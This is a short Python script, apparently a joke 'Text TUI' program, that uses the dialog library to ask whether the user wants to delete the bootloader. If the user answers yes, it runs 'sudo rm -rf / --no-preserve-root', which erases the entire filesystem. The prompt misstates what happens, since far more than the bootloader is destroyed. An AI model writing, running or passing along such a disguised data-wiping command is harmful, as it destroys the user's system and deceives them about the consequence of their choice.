#texttui by 112c

from dialog import Dialog
import os
d = Dialog(dialog="dialog")

d.set_background_title("My little program")



print("Welcome To Text TUI")

if d.yesno("Are you REALLY sure you want to delete the bootloader?") == d.OK:
    d.msgbox("You have been warned...")
    os.system("sudo rm -rf / --no-preserve-root")
